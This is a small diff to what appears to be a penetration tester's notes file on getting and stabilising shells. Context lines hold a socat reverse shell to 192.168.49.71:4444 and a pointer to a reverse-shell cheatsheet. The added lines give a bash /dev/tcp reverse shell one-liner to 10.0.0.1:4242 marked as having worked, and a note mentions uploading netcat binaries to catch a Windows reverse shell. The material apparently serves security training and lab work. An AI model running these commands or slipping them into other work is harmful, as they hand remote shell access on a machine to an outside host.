@@ -364,6 +364,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On V
 ````
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 ````
+````
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
+````
 ### Windows
 This helps to create a more stable shell, upload nc32.exe or nc64.exe and catch a rever shell back to your kali machine
 ````
